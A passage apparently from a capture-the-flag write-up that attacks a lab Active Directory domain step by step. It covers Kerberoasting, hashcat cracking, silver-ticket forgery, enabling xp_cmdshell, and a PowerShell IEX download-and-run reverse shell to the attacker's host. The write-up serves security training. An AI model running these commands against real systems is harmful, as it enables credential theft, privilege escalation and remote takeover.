+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/getTGT.py -dc-ip dc1.scrm.local scrm/ksimpson:ksimpson
+</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in ksimpson.ccache</span></span></code></pre></div></p>
+<p>And to use this ticket, I need to store it in an environment variable that impacket uses by default
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/getTGT.py --help
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>-k                    Use Kerberos authentication. Grabs credentials from ccache file <span style="color:#f92672">(</span>KRB5CCNAME<span style="color:#f92672">)</span> based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ export KRB5CCNAME<span style="color:#f92672">=</span>ksimpson.ccache</span></span></code></pre></div></p>
+<p>From here, using <a href="https://github.com/SecureAuthCorp/impacket"><em>impacket-scripts</em></a> I can now query <em>LDAP</em> for different information, so I&rsquo;ll look for any <em>Service Principal Names</em> to see if <a href="https://youtu.be/xH5T9-m9QXw"><em>kerberosting attack</em></a> might work.</p>
+<ul>
+<li>Note: If you&rsquo;re following along using older versions of impacket (&lt;0.9.25) and you&rsquo;re getting an error like <em>&hellip; derived from BaseException &hellip;</em> then you can either clone the newer version of <a href="https://github.com/SecureAuthCorp/impacket"><em>impacket-scripts</em></a> or follow the <a href="https://github.com/SecureAuthCorp/impacket/issues/1206"><em>solution</em></a> proposed by the author of this machine. For this write-up, I will use the newer version of impacket 0.10.1 as of the time of writing this.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/GetUserSPNs.py -dc-host dc1.scrm.local scrm.local/ksimpson:ksimpson -k -no-pass -target-domain scrm.local
+</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
+</span></span><span style="display:flex;"><span>----------------------------  ------  --------  --------------------------  --------------------------  ----------
+</span></span><span style="display:flex;"><span>MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 18:32:02.351452  2022-10-01 02:52:28.543759             
+</span></span><span style="display:flex;"><span>MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 18:32:02.351452  2022-10-01 02:52:28.543759             </span></span></code></pre></div>
+<ul>
+<li>Notice the use of <em>dc1.scrm.local</em> using the flag <em>-dc-host</em> and not the <em>ip address</em> like <em>-dc-host 10.10.11.168</em> which will give an error.</li>
+</ul>
+<p>It appears that we can do <a href="https://youtu.be/xH5T9-m9QXw"><em>kerberosting attack</em></a> against <em>MSSQLSvc</em>, so let&rsquo;s append the <em>-request</em> to the previous command to get the encrypted ticket for this service.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/GetUserSPNs.py -dc-host dc1.scrm.local scrm.local/ksimpson:ksimpson -k -no-pass -target-domain scrm.local -request
+</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
+</span></span><span style="display:flex;"><span>----------------------------  ------  --------  --------------------------  --------------------------  ----------
+</span></span><span style="display:flex;"><span>MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 18:32:02.351452  2022-10-01 02:52:28.543759             
+</span></span><span style="display:flex;"><span>MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 18:32:02.351452  2022-10-01 02:52:28.543759             
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$38ac0e94da96e9299e64f23d20f88676$e2108160934493e1d8fb52858eb0b496de7803f86824345c8248901d01f29d72b4d70d7893ef49a2b1533b370713430e1425005bf94e0ccf8caa86b641cf79e6c505468ecfb10a0bbb92401e60d6e8e739415ac438710dabb4a91ff0f40717735588976685723d47511c4018ec60820beed32a2f0af6bb970781581c46afc1df4506058711c38a6892b615f4f71acd96cde456d8ad941cdb41957fbeaab2329ae86c952ee4a08c4240a26cdda138b72ee120a4476aaeb89974bc00afab02149b4b45deff940965e3182741ad128f5f4cb126557d4e6e5fff6cd4e929db656000296d8f1da9b8140563e1d655c3403e9af591b1d7842d4afaab1a0d38bc07eac84dbea11ac57c7b6f60af3fa23cdcf102813add3109b34738d10251731933de08f26f9dde27483a90f557644b1bcffd7f9d66f4bad2881f379be926d95ac3ef42c71eb7423dcbc06ea3b4977b119cb9ea29579e8da48b23d8414268488bd0160dffa75c77349fdbdbd615fc2c2011b9ec3a1f4af34e953d026c66b71456b7688a01473c8f8b3feccec7bfe1704f031a5ed5ae1ac654a8652e2bf7c9bb365c01d23fba38a6dcbd4cd62dbf0fd6d102a403fb5f0beb5e05132f7684ff73e8d3f34111d7bd2b313c8b7cf09df19d98c40235d9a825b5a084f65ba14cb10c78c404e159b4976cd081835d627fba402877285cc9dba95a37069cb85d79e49f129ac45f3cc1b819a61e84beeebaebfd6ed87d8a8ddeef31d953050692bf5fde183e28fb96c3dac626e7d9ec7e87d860b319b8995bc485e18be089e19f2500f1d209c43880146b9381f33d36d659219a061596feaed3d6a97602bc823c256e635bbb3eeaa708e5365006d97570dccc71fae7e0d08aaab633ee03ce96a2650628f9e7715ae90b5a5b0e9221ae6a2bf88907ac9aaa0a534b09799b0261787d77c9ccb74cdcfe07e840e1dcbcd6c5eb64976ce3abed14c2e92c3754daf3941009a60652822e03346a7ad5ca4a3766ea68fa8edd8968bfe1d98a069a064e41926e762bc1c6abb3e2a57c87505ef9d377b1fc5fdea5e7b0af4de5ccaaa4ee78548a7e0f19e9a28c34d18285c1c792cd481b7867ad45b5e15035e368f3e2735d0bf66fe5427943115f08ab3ef186c2169a7c305ae48b61180d4ef1d51e3179d181fb97be3c6b26ca8419f6680d714b45c96ae443e3ea8bcd319045847a2db3e2942082805540bb39c790a535e992e9f4f860922bdaeb181680f1366c9d0119ccd97d02fa18aae5af9138990771bcd25da4356c31896f6b471393da256c0f64d86851e6705ba68298711a21cc039f98139056813d1ebb4dd43085e68668a31c76e0935c8146eb490260614a58786816cc63530bd6cb9034b646e359647e61b650fd73f10839feb4b8c92a8d58c8c7ab604b07a0cd86aaab0e4586231fc74abf0e3ca0</span></span></code></pre></div></p>
+<p>And now we try to crack this ticket using hachcat and rockyou.txt</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">13100</span> <span style="color:#e6db74">&#39;$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$38ac0e94da96e9299e64f23d20f88676$e2108160934493e1d8fb52858eb0b496de7803f86824345c8248901d01f29d72b4d70d7893ef49a2b1533b370713430e1425005bf94e0ccf8caa86b641cf79e6c505468ecfb10a0bbb92401e60d6e8e739415ac438710dabb4a91ff0f40717735588976685723d47511c4018ec60820beed32a2f0af6bb970781581c46afc1df4506058711c38a6892b615f4f71acd96cde456d8ad941cdb41957fbeaab2329ae86c952ee4a08c4240a26cdda138b72ee120a4476aaeb89974bc00afab02149b4b45deff940965e3182741ad128f5f4cb126557d4e6e5fff6cd4e929db656000296d8f1da9b8140563e1d655c3403e9af591b1d7842d4afaab1a0d38bc07eac84dbea11ac57c7b6f60af3fa23cdcf102813add3109b34738d10251731933de08f26f9dde27483a90f557644b1bcffd7f9d66f4bad2881f379be926d95ac3ef42c71eb7423dcbc06ea3b4977b119cb9ea29579e8da48b23d8414268488bd0160dffa75c77349fdbdbd615fc2c2011b9ec3a1f4af34e953d026c66b71456b7688a01473c8f8b3feccec7bfe1704f031a5ed5ae1ac654a8652e2bf7c9bb365c01d23fba38a6dcbd4cd62dbf0fd6d102a403fb5f0beb5e05132f7684ff73e8d3f34111d7bd2b313c8b7cf09df19d98c40235d9a825b5a084f65ba14cb10c78c404e159b4976cd081835d627fba402877285cc9dba95a37069cb85d79e49f129ac45f3cc1b819a61e84beeebaebfd6ed87d8a8ddeef31d953050692bf5fde183e28fb96c3dac626e7d9ec7e87d860b319b8995bc485e18be089e19f2500f1d209c43880146b9381f33d36d659219a061596feaed3d6a97602bc823c256e635bbb3eeaa708e5365006d97570dccc71fae7e0d08aaab633ee03ce96a2650628f9e7715ae90b5a5b0e9221ae6a2bf88907ac9aaa0a534b09799b0261787d77c9ccb74cdcfe07e840e1dcbcd6c5eb64976ce3abed14c2e92c3754daf3941009a60652822e03346a7ad5ca4a3766ea68fa8edd8968bfe1d98a069a064e41926e762bc1c6abb3e2a57c87505ef9d377b1fc5fdea5e7b0af4de5ccaaa4ee78548a7e0f19e9a28c34d18285c1c792cd481b7867ad45b5e15035e368f3e2735d0bf66fe5427943115f08ab3ef186c2169a7c305ae48b61180d4ef1d51e3179d181fb97be3c6b26ca8419f6680d714b45c96ae443e3ea8bcd319045847a2db3e2942082805540bb39c790a535e992e9f4f860922bdaeb181680f1366c9d0119ccd97d02fa18aae5af9138990771bcd25da4356c31896f6b471393da256c0f64d86851e6705ba68298711a21cc039f98139056813d1ebb4dd43085e68668a31c76e0935c8146eb490260614a58786816cc63530bd6cb9034b646e359647e61b650fd73f10839feb4b8c92a8d58c8c7ab604b07a0cd86aaab0e4586231fc74abf0e3ca0&#39;</span> /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$38ac0e94da96e9299e64f23d20f88676$e2108160934493e1d8fb52858eb0b496de7803f86824345c8248901d01f29d72b4d70d7893ef49a2b1533b370713430e1425005bf94e0ccf8caa86b641cf79e6c505468ecfb10a0bbb92401e60d6e8e739415ac438710dabb4a91ff0f40717735588976685723d47511c4018ec60820beed32a2f0af6bb970781581c46afc1df4506058711c38a6892b615f4f71acd96cde456d8ad941cdb41957fbeaab2329ae86c952ee4a08c4240a26cdda138b72ee120a4476aaeb89974bc00afab02149b4b45deff940965e3182741ad128f5f4cb126557d4e6e5fff6cd4e929db656000296d8f1da9b8140563e1d655c3403e9af591b1d7842d4afaab1a0d38bc07eac84dbea11ac57c7b6f60af3fa23cdcf102813add3109b34738d10251731933de08f26f9dde27483a90f557644b1bcffd7f9d66f4bad2881f379be926d95ac3ef42c71eb7423dcbc06ea3b4977b119cb9ea29579e8da48b23d8414268488bd0160dffa75c77349fdbdbd615fc2c2011b9ec3a1f4af34e953d026c66b71456b7688a01473c8f8b3feccec7bfe1704f031a5ed5ae1ac654a8652e2bf7c9bb365c01d23fba38a6dcbd4cd62dbf0fd6d102a403fb5f0beb5e05132f7684ff73e8d3f34111d7bd2b313c8b7cf09df19d98c40235d9a825b5a084f65ba14cb10c78c404e159b4976cd081835d627fba402877285cc9dba95a37069cb85d79e49f129ac45f3cc1b819a61e84beeebaebfd6ed87d8a8ddeef31d953050692bf5fde183e28fb96c3dac626e7d9ec7e87d860b319b8995bc485e18be089e19f2500f1d209c43880146b9381f33d36d659219a061596feaed3d6a97602bc823c256e635bbb3eeaa708e5365006d97570dccc71fae7e0d08aaab633ee03ce96a2650628f9e7715ae90b5a5b0e9221ae6a2bf88907ac9aaa0a534b09799b0261787d77c9ccb74cdcfe07e840e1dcbcd6c5eb64976ce3abed14c2e92c3754daf3941009a60652822e03346a7ad5ca4a3766ea68fa8edd8968bfe1d98a069a064e41926e762bc1c6abb3e2a57c87505ef9d377b1fc5fdea5e7b0af4de5ccaaa4ee78548a7e0f19e9a28c34d18285c1c792cd481b7867ad45b5e15035e368f3e2735d0bf66fe5427943115f08ab3ef186c2169a7c305ae48b61180d4ef1d51e3179d181fb97be3c6b26ca8419f6680d714b45c96ae443e3ea8bcd319045847a2db3e2942082805540bb39c790a535e992e9f4f860922bdaeb181680f1366c9d0119ccd97d02fa18aae5af9138990771bcd25da4356c31896f6b471393da256c0f64d86851e6705ba68298711a21cc039f98139056813d1ebb4dd43085e68668a31c76e0935c8146eb490260614a58786816cc63530bd6cb9034b646e359647e61b650fd73f10839feb4b8c92a8d58c8c7ab604b07a0cd86aaab0e4586231fc74abf0e3ca0:Pegasus60
+</span></span><span style="display:flex;"><span>    ...</span></span></code></pre></div>
+<p>The password for this SQL service is <em>Pegasus60</em>, so I can now use a <a href="https://youtu.be/_nJ-b1UFDVM"><em>Silver Ticket Attack</em></a> against this service and pretend to be the Administrator.</p>
+<ul>
+<li>
+<p>First, I need to get the <em>NTLM hash</em> for this password which is required by <em>impacket-ticketer.py</em> script. We can do that using an online NTLM hash generator like <a href="https://tobtu.com/lmntlm.php"><em>tobtu</em></a> for example.
+<img src="generating-ntlm-hash-for-silver-ticket-attack.png" alt="NTLM Hash generation for Silver Ticket Attack"></p>
+</li>
+<li>
+<p>Next, I need to get the SID of the domain. There are plenty of ways, using <em>LDAP</em> for example, but the simplest one is to use <em>impacket-secrectsdump.py</em> with the <em>-debug</em> option since we are on linux.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/secretsdump.py scrm.local/ksimpson:ksimpson@dc1.scrm.local -k -no-pass -debug
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Calling DRSCrackNames <span style="color:#66d9ef">for</span> S-1-5-21-2743207045-1827831105-2542523200-500 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Calling DRSGetNCChanges <span style="color:#66d9ef">for</span> <span style="color:#f92672">{</span>edaf791f-e75b-4711-8232-3cd66840032a<span style="color:#f92672">}</span> 
+</span></span><span style="display:flex;"><span>    Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>        File <span style="color:#e6db74">&#34;/opt/impacket/build/scripts-3.10/secretsdump.py&#34;</span>, line 230, in dump
+</span></span><span style="display:flex;"><span>            self.__NTDSHashes.dump<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>    ...</span></span></code></pre></div>
+It does not really matter if we get an error, the important thing is that we got the domain SID <em>S-1-5-21-2743207045-1827831105-2542523200</em> (without <em>-500</em> which is the RID)</p>
+</li>
+<li>
+<p>Finally, we can request a <em>Silver Ticket</em> using <em>impacket-ticketer.py</em>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -user ksimpson -password ksimpson Administrator
+</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating basic skeleton ticket and PAC Infos
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Customizing ticket <span style="color:#66d9ef">for</span> scrm.local/Administrator
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_LOGON_INFO
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_CLIENT_INFO_TYPE
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncTicketPart
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncAsRepPart
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Signing/Encrypting final ticket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_SERVER_CHECKSUM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_PRIVSVR_CHECKSUM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncTicketPart
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncASRepPart
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in Administrator.ccache</span></span></code></pre></div></p>
+</li>
+</ul>
+<p>Now we can export the ticket like we did before, and interact with the SQL service pretending to be the Administrator.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ export KRB5CCNAME<span style="color:#f92672">=</span>Administrator.ccache
+</span></span><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/mssqlclient.py scrm.local -k -no-pass
+</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Encryption required, switching to TLS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: master
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>LANGUAGE<span style="color:#f92672">)</span>: Old Value: , New Value: us_english
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>PACKETSIZE<span style="color:#f92672">)</span>: Old Value: 4096, New Value: <span style="color:#ae81ff">16192</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;master&#39;</span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ACK: Result: <span style="color:#ae81ff">1</span> - Microsoft SQL Server <span style="color:#f92672">(</span><span style="color:#ae81ff">150</span> 7208<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>SQL&gt; </span></span></code></pre></div></p>
+<p>Let&rsquo;s enumerate databases looking for some credentials
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>SQL&gt; SELECT name FROM master.dbo.sysdatabases
+</span></span><span style="display:flex;"><span>name                                                                                                                               
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------------------------------------------------------   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>master                                                                                                                             
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tempdb                                                                                                                             
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>model                                                                                                                              
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msdb                                                                                                                               
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ScrambleHR                                                                                                                         
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SQL&gt; use ScrambleHR;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: ScrambleHR
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;ScrambleHR&#39;</span>.
+</span></span><span style="display:flex;"><span>SQL&gt; SELECT  * FROM INFORMATION_SCHEMA.TABLES;
+</span></span><span style="display:flex;"><span>TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME     TABLE_TYPE   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------   --------------   -----------   ------------   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ScrambleHR          dbo           Employees     b<span style="color:#e6db74">&#39;BASE TABLE&#39;</span>   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ScrambleHR          dbo           UserImport    b<span style="color:#e6db74">&#39;BASE TABLE&#39;</span>   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ScrambleHR          dbo           Timesheets    b<span style="color:#e6db74">&#39;BASE TABLE&#39;</span>   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SQL&gt; <span style="color:#66d9ef">select</span> * from UserImport;
+</span></span><span style="display:flex;"><span>LdapUser     LdapPwd                  LdapDomain     RefreshInterval   IncludeGroups   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---------   ---------------------   --------------   ---------------   -------------   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MiscSvc      ScrambledEggs9900       scrm.local          <span style="color:#ae81ff">90</span>                  <span style="color:#ae81ff">0</span>   </span></span></code></pre></div></p>
+<p>Looks like we got new Creds <em>MiscSvc:ScrambledEggs9900</em></p>
+<ul>
+<li>From this point there are <em>2 ways</em> to solve the machine, either get the Administrator directly and then read the user.txt, or get shell via normal user then escalate to Administrator. Both ways aren&rsquo;t complicated, and are almost indentical, it just depends which one you choose to do first. For this write-up, I&rsquo;ll get the user.txt flag then escalate to Administrator, but I will discuss the other way at the end.</li>
+</ul>
+<p>So since we have Administrative privileges on the SQL service, we can try to enable <em>xp_cmdshell</em> and then execute commands that way. The process is very simple using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py"><em>impacket-mssqlclient.py</em></a>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>SQL&gt; enable_xp_cmdshell
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 185: Configuration option <span style="color:#e6db74">&#39;show advanced options&#39;</span> changed from <span style="color:#ae81ff">0</span> to 1. Run the RECONFIGURE statement to install.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 185: Configuration option <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> changed from <span style="color:#ae81ff">0</span> to 1. Run the RECONFIGURE statement to install.
+</span></span><span style="display:flex;"><span>SQL&gt; xp_cmdshell whoami
+</span></span><span style="display:flex;"><span>output                                                                             
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>scrm<span style="color:#ae81ff">\s</span>qlsvc                                                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NULL                                                                               </span></span></code></pre></div></p>
+<p>Since I have credentials for <em>MiscSvc</em>, a simple way to escalate to that user from this, is via powershell by creating a <em>New PSCredential Object</em>, but I need first to get a <em>proper shell</em>. I&rsquo;ll use <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"><em>Invoke-PowerShellTcp.ps1</em></a> from <a href="https://github.com/samratashok/nishang"><em>Nishang</em></a> project.</p>
+<ul>
+<li>
+<p>First, I&rsquo;ll copy <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"><em>Invoke-PowerShellTcp.ps1</em></a> to my current directory and append at the end of this script the following line
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.59 -Port <span style="color:#ae81ff">8989</span></span></span></code></pre></div></p>
+</li>
+<li>
+<p>Next, I&rsquo;ll open a webserver on port 8000, and listen for reverse shell connection on port 8989
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">8989</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8989</span> ...</span></span></code></pre></div></p>
+</li>
+<li>
+<p>Then, I&rsquo;ll use <em>powershell IEX</em> expression to load the script directly into RAM from my server without installing anything or touching the disk
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>SQL&gt; xp_cmdshell <span style="color:#e6db74">&#34;powershell IEX (New-Object Net.WebClient).DownloadString(\&#34;http://10.10.16.59:8000/Invoke-PowerShellTcp.ps1\&#34;);&#34;</span></span></span></code></pre></div>
+<img src="getting-reverse-shell-as-sqlsvc.png" alt="Getting Reverse Shell as sqlvc"></p>
+</li>
+</ul>
+<p>In order to switch to <em>MiscSvc</em> user I&rsquo;ll use <em>New PSCredential Object</em> and <em>Invoke-Command</em> which are built in command from powershell
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; $pass <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#34;ScrambledEggs9900&#34;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; $cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;scrm.local\MiscSvc&#34;</span>, $pass<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; Invoke-Command -ComputerName dc1.scrm.local -Credential $cred <span style="color:#f92672">{</span>whoami<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>scrm<span style="color:#ae81ff">\m</span>iscsvc</span></span></code></pre></div></p>
